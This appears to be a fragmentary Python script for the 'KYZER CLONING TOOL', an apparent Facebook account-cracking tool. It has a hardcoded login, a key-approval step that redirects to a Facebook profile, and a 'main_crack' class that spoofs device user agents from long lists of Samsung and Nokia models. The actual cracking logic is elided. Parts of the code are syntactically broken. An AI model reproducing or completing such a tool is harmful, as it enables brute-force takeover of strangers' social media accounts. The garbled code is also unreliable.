...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO KYZER CLONING TOOL          ')
...
def l():
    ...
    "Z1", "Z10", "Z1i", "Z1LITE", "Z1PRO", "Z1x", "Z34", "V23", "V25", "Y29",
    "V15", "V17", "V19", "Y27", "Y29", "Y33", "Y36", "Y39", "Y41", "Y43",
    "Y45", "Y47", "Y49", "Y51", "Y53", "Y55", "Y57", "Y59", "Y61", "Y63",
    "Y65", "Y67", "Y69", "Y71", "Y73", "Y75", "Y77", "Y79", "Y81", "Y83"])
...
logo = (f'''     \033[1;32m
 ...
 ___   _  __   __  _______  _______  ______   
|   | | ||  | |  ||       ||       ||    _ |  
|   |_| ||  |_|  ||____   ||    ___||   | ||  
|      _||       | ____|  ||   |___ |   |_||_ 
|     |_ |_     _|| ______||    ___||    __  |
|    _  |  |   |  | |_____ |   |___ |   |  | |
|___| |_|  |___|  |_______||_______||___|  |_|

	
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWNER     \x1b[1;97m● \033[38;5;46mKYZER
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mGithub   \x1b[1;97m  ● \033[38;5;46mKYZER
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46m[TOOL]     \x1b[1;97m● \x1b[1;97mV/0.1
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mTool Type \x1b[1;97m● \033[38;5;46mFREE+RANDOM\x1b[38;5;196m┼\033[1;41m\033[1;97m\x1b[38;5;196m\033[47mFILE\x1b[0m\x1b[38;5;196m┼
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
def linex():
        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
...
while attemps < 12345677901:
    ...
    if username == 'Kyzer' and password == 'Clone':
...
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = "KYZER("+str(os.getuid())+"(CLONE)"+str(os.getuid())+")TOOL"
  id = '-'.join(uuid)
  try:
    ...
    if id in httpCaht:
     ...
     # print(" \033[32;1m[+] Your Key : "+id))
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://www.facebook.com/profile.php?id=100051353153084?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
class main_crack():
    ...
    def crack(self,id):
        ...
        try:
            ...
            print('Wrong File Please confirm your file etc...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
    ...
    def methodA(self, sid, name, psw):
        try:
            ...
            model = random.choice([models=["SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E","SM-G991U","SM-G973U","SM-G970U","SM-G781B","SM-G780F","SM-G986U","SM-G988U","SM-G981U","SM-G996U","SM-G998U","SM-G973F","SM-G980F","SM-G988B","SM-G981B","SM-G986B","SM-G780W","SM-G780G","SM-A025F","SM-A115F","SM-A125F","SM-A325F","SM-A515F","SM-A715F","SM-A735F","SM-A125U","SM-A325U","SM-A715U","SM-A025M","SM-A115M","SM-A125M","SM-A325M","SM-A515M","SM-A715M","SM-A025G","SM-A115G","SM-A125G","SM-A325G","SM-A515G","SM-A715G","SM-A025N","SM-A115N","SM-A125N","SM-A325N","SM-A515N","SM-A715N"])
            ######m1#####
            model = random.choice(["Nokia 5230","Nokia X7","Nokia C3","Nokia C1","Nokia C3","Nokia X71","Nokia 1 Plus","Nokia C01 Plus","Nokia C1 2nd Edition","N152DL","Nokia C110","Nokia C12","Nokia C12 Pro","Nokia C2","Nokia C2 2nd Edition","Nokia C2 Tennen","Nokia C20","Nokia C21 Plus","Nokia Lumia 900","Nokia 808 PureView"])
